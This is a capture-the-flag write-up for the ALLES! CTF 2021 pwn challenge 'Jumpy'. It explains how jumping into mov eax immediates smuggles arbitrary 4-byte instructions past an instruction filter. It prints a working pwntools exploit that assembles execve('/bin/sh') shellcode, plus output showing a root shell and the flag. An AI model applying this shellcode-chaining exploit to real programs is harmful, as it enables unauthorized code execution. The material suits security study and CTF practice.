## Jumpy

> Points: 139
>
> Solves: 82

### Description:
https://github.com/mito753/CTF/blob/main/2021/ALLES!_CTF_2021/Pwn_Jumpy/41zPfaL3WFL.jpg


### Attachments:
```
jumpy  https://static.allesctf.net/ab1671dfdbc9923949d2dbc2bf1ff66006f86bb623cd9b2cbf94ce3f631dfbdd/jumpy
jumpy.c  https://static.allesctf.net/e8f31b0fc631eb709049df0d42491ddca1562a016474c10fdb03cf66f58113c8/jumpy.c
```

## Analysis:

The C language source code is provided below.


When you execute the jampy program, you can see that only 3 instructions can be specified.
supported insns:
- moveax $imm32
- jmp $imm8
- ret
- (EOF)

After the jmp instruction, it is checked if the next instruction is mov eax or jmp or ret.

```c
const instruction_t INSNS[3] = {
    {"ret", OP_RET},
    {"jmp", OP_SHORT_JMP},
    {"moveax", OP_MOV_EAX_IMM32},
};

const instruction_t *isns_by_mnemonic(char *mnemonic)
{
    for (int i = 0; i < sizeof(INSNS) / sizeof(INSNS[0]); i++)
        if (!strcmp(mnemonic, INSNS[i].mnemonic))
            return &INSNS[i];
    return NULL;
}
```

## Solution:

Since there is no instruction check after mov eax, I can execute any 4-byte instruction by made the following instruction sequence.

jmp 1
moveax 0xb8
moveax (Arbitrary 4-byte instruction)

```
             mov eax
          +-----------+
          |           |        
eb 01 b8 b8 00 00 00 b8 xx xx xx xx
|         ^
|         |
+---------+
   jmp 1

```

Since "/bin/sh" has 4 bytes or more and the mmap area (0x1337000000) cannot be written, the character string of "/bin/sh" was made on the stack.
```
mov bx, 0x68
shl rbx, 16
mov bx, 0x732f
shl rbx, 16
mov bx, 0x6e69
shl rbx, 16
mov bx, 0x622f
push rbx; mov rdi, rsp
```

## Exploit code:
```python
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './jumpy'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = process("ncat --ssl 7b000000d136daaf77c18b37-jumpy.challenge.master.allesctf.net 31337", shell=True)
else:
  s = process(BINARY)
 
def Set_ins(data):
  s.sendlineafter("> ", "jmp 1")
  s.sendlineafter("> ", "moveax 184")
  s.sendlineafter("> ", "moveax " + str(u32(data)))

# rsi = 0; rdx = 0
Set_ins(asm('''xor rsi, rsi; nop'''))
Set_ins(asm('''push rsi; pop rdx; nop; nop'''))

# make /bin/sh in stack
Set_ins(asm('''mov bx, 0x68'''))
Set_ins(asm('''shl rbx, 16'''))
Set_ins(asm('''mov bx, 0x732f'''))
Set_ins(asm('''shl rbx, 16'''))
Set_ins(asm('''mov bx, 0x6e69'''))
Set_ins(asm('''shl rbx, 16'''))
Set_ins(asm('''mov bx, 0x622f'''))
Set_ins(asm('''push rbx; mov rdi, rsp'''))

# rax = 0x3b
# syscall
Set_ins(asm('''xor rbx, rbx; nop'''))
Set_ins(asm('''add rbx, 0x3b'''))
Set_ins(asm('''push rbx; pop rax; syscall'''))

# Start shell
s.sendlineafter("> ", "a")

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ python solve.py r
[*] '/home/mito/CTF/ALLES!_CTF_2021/Pwn_Jumpy/jumpy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/bin/sh': pid 62372
[*] Switching to interactive mode

running your code...
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls -l
total 92
lrwxrwxrwx   1 root root     7 Aug 27 07:16 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Apr 15  2020 boot
drwxr-xr-x   5 root root   360 Sep  4 08:08 dev
drwxr-xr-x   1 root root  4096 Sep  4 08:08 etc
-rw-r--r--   1 root root   100 Aug 29 22:12 flag
drwxr-xr-x   2 root root  4096 Apr 15  2020 home
-rwxr-xr-x   1 root root 19768 Aug 29 22:12 jumpy
lrwxrwxrwx   1 root root     7 Aug 27 07:16 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Aug 27 07:16 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Aug 27 07:16 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Aug 27 07:16 libx32 -> usr/libx32
drwxr-xr-x   2 root root  4096 Aug 27 07:16 media
drwxr-xr-x   2 root root  4096 Aug 27 07:16 mnt
drwxr-xr-x   2 root root  4096 Aug 27 07:16 opt
dr-xr-xr-x 783 root root     0 Sep  4 08:08 proc
drwx------   2 root root  4096 Aug 27 07:27 root
drwxr-xr-x   5 root root  4096 Aug 27 07:27 run
lrwxrwxrwx   1 root root     8 Aug 27 07:16 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Aug 27 07:16 srv
dr-xr-xr-x  13 root root     0 Sep  4 08:08 sys
drwxrwxrwt   2 root root  4096 Aug 27 07:27 tmp
drwxr-xr-x  13 root root  4096 Aug 27 07:16 usr
drwxr-xr-x  11 root root  4096 Aug 27 07:27 var
-rwxr-xr-x   1 root root 18744 Aug 29 22:12 ynetd
$ cat flag
ALLES!{people have probably done this before but my google foo is weak. segmented shellcode maybe?}
```
